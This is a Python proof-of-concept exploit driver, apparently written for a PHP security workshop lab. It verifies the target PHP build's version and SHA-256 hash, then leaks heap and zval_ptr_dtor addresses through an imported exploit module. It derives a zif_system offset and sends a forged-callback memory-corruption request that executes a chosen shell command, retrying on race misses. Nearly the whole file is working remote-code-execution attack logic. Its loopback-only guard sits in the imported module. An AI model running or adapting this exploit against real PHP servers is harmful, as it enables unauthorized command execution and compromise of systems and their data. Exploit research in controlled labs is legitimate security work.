#!/usr/bin/env python3
"""Second local PoC: inspect the build, then run one selected command.

This script reuses Script01's leak and callback implementation. It accepts only a loopback /php-version.php URL, with a selectable local port. It records the local PHP version and binary hash, warns when either differs from the validated lab, and still attempts the same bounded stages. It does not infer working offsets from a version.

If the instructor changes PHP, inspect the new ELF and revalidate the session lifecycle, leak shapes, heap carrier placement, and forged structure in Script01_Php2Shell.py. A warning is an invitation to investigate, not evidence that the old offsets became correct for the new build.
Analysis/Script06_SurpriseVersion.md is the step-by-step worksheet.
"""
from __future__ import annotations

import argparse
import datetime as dt
import hashlib
import json
from pathlib import Path
import secrets
import subprocess
import sys
import time

import Script01_Php2Shell as core

PINNED_SHA256 = "5123326076cd3e77bf5e9f97e8f63b7368f7bfa18b37da7a749e29cc1342d437"
LOCAL_URL = "http://127.0.0.1:8080/php-version.php"


def binary_hash() -> str:
	"""Read the exact ELF identity from the running local service.

	A PHP version header is only a coarse guard: different builds can share 8.4.26 while moving symbols or changing structure layouts. Docker exec reads the file without serving an HTTP request or touching PHP workers.
	"""
	completed = subprocess.run(
		["docker", "compose", "exec", "-T", "php",
		"sha256sum", "/usr/local/bin/php"],
		capture_output=True, text=True, check=False)
	if completed.returncode:
		detail = completed.stderr.strip()
		if 'service "php" is not running' in detail:
			raise RuntimeError(
				"PHP service stopped after the previous run. Save "
				"'docker compose ps -a' and 'docker compose logs --tail=50 php' "
				"for analysis, then run 'docker compose up -d php'. "
				"The vault volume does not need a reset")
		raise RuntimeError("Cannot read the local PHP binary hash: " + detail)
	value = completed.stdout.split()[0]
	if len(value) != 64:
		raise RuntimeError("Unexpected sha256sum output")
	return value.lower()


def wait_for_php(target: core.Target, seconds: float = 12.0) -> str:
	"""Wait for the local endpoint to answer before a fresh leak attempt.

	The final memory-corruption request can return a verified command result and then crash the PHP container's PID 1 with exit code 139. The default Compose lab restarts on failure. Another local stack may need its own restart policy. Retrying while nginx has no upstream only creates 502 reports, so check readiness before a new producer request.
	"""
	deadline = time.monotonic() + seconds
	last_error: Exception | None = None
	while time.monotonic() < deadline:
		try:
			return core.preflight(target, expected_version=None)
		except Exception as exc:
			last_error = exc
			time.sleep(0.5)
	raise RuntimeError(
		f"PHP did not recover within {seconds:g}s ({last_error}). "
		"Inspect docker compose ps -a and docker compose logs php")


def main() -> int:
	"""Validate one local target, then retry with fresh leaks on race misses."""
	parser = argparse.ArgumentParser(description=__doc__)
	parser.add_argument("--command", required=True,
						help="Plain local command, e.g. id or ls /opt/workshop")
	parser.add_argument("--url", default=LOCAL_URL,
						help="Loopback /php-version.php URL; defaults to port 8080")
	parser.add_argument("--elf", type=Path,
						help="Exact target PHP ELF, required for another loopback port")
	parser.add_argument("--attempts", type=int, default=3,
						help="Bounded fresh attempts after a race miss (1-5)")
	parser.add_argument("--output-dir", type=Path)
	args = parser.parse_args()

	try:
		if not 1 <= args.attempts <= 5:
			raise ValueError("--attempts must be between 1 and 5")
		target = core.parse_target(args.url, allow_loopback_port=True)
		if target.port != 8080 and args.elf is None:
			raise ValueError(
				"An alternate local port requires --elf with that target's "
				"exact PHP binary; the workshop Compose service is port 8080")
		# Reject unsupported command syntax/length before creating a run.
		# The core parser refuses nonloopback hosts and other URL paths.
		core.local_command("0" * 16, args.command)
		observed_version = wait_for_php(target)
		digest = (hashlib.sha256(args.elf.read_bytes()).hexdigest()
				if args.elf else binary_hash())
	except (ValueError, RuntimeError, OSError) as exc:
		print(f"[abort] {exc}", file=sys.stderr)
		return 1

	stamp = dt.datetime.now(dt.UTC).strftime("%Y%m%dT%H%M%S%fZ")
	root = args.output_dir or Path(f"PoC-Run-{stamp}")
	root.mkdir(parents=True, exist_ok=False)
	hash_matches = digest == PINNED_SHA256
	version_matches = observed_version == core.PHP_VERSION
	print(f"[build] observed {observed_version} | SHA-256 {digest}", flush=True)
	if not hash_matches:
		print(f"[warning] binary hash differs from calibrated "
			f"{PINNED_SHA256}; continuing with old offsets for analysis",
			flush=True)
	if not version_matches:
		print(f"[warning] PHP version differs from calibrated "
			f"{core.PHP_VERSION}; continuing with old request shapes "
			"and offsets for analysis", flush=True)
	for number in range(1, args.attempts + 1):
		# Each attempt owns its own transcript and must obtain fresh heap and code addresses. In particular, never carry a leaked address across a PHP process restart: ASLR will move the image and heap.
		output = root / f"Attempt-{number:02d}"
		output.mkdir()
		result = {"target": args.url, "binary_sha256": digest,
				"binary_hash_source": str(args.elf) if args.elf else "compose php",
				"binary_hash_matches_calibration": hash_matches,
				"observed_php_version": observed_version,
				"version_matches_calibration": version_matches,
				"mode": "selected local command", "command": args.command,
				"attempt": number, "output_dir": str(output)}
		print(f"[attempt {number}/{args.attempts}]", flush=True)
		try:
			if number > 1:
				current_version = wait_for_php(target)
				if current_version != observed_version:
					raise RuntimeError(
						f"PHP version changed during this run: "
						f"{observed_version} -> {current_version}")
			heap, result["heap"] = core.run_leak_stage(
				target, core.STAGES["heap"], output, observed_version)
			print(f"[heap] strict Zend base {heap:#x}", flush=True)
			dtor, result["code"] = core.run_leak_stage(
				target, core.STAGES["code"], output, observed_version)
			print(f"[code] strict zval_ptr_dtor {dtor:#x}", flush=True)
			print(f"[offset] zif_system candidate "
				f"{dtor + core.ZIF_SYSTEM_FROM_DTOR:#x}", flush=True)
			nonce = secrets.token_hex(8)
			# This shares the same forged callback as Script01, but requests the caller's short command instead of the vault proof script.
			final = core.final_request(
				target, heap, dtor, nonce, output, args.command)
			result["final"] = final
			print(json.dumps({
				"stage": "final",
				"execution_proof_verified": final["execution_proof_verified"],
				"command_done_seen": final["command_done_seen"],
				"failure_reason": final["failure_reason"],
				"response_path": final["response_path"]}), flush=True)
			if final["execution_proof_verified"]:
				# The nonce and :OK marker surround observable command output in the saved response. A plain OOM fatal has neither marker.
				body = (output / "Final.Response.body").read_text(
					encoding="utf-8", errors="replace")
				print("\n[command response]\n" + body, flush=True)
				return 0
			print(f"[miss] {final['failure_reason']}; "
				"start a fresh attempt", flush=True)
		except Exception as exc:
			result["error"] = f"{type(exc).__name__}: {exc}"
			print(f"[miss] {result['error']}", file=sys.stderr, flush=True)
			if "PHP did not recover within" in str(exc):
				return 1
			if "PHP version changed during this run" in str(exc):
				return 1
		finally:
			result["completed_utc"] = dt.datetime.now(dt.UTC).isoformat()
			(output / "Run.json").write_text(
				json.dumps(result, indent=2) + "\n", encoding="utf-8")
	print(f"[abort] no verified execution in {args.attempts} attempts; "
		f"inspect {root}", file=sys.stderr)
	return 1


if __name__ == "__main__":
	raise SystemExit(main())
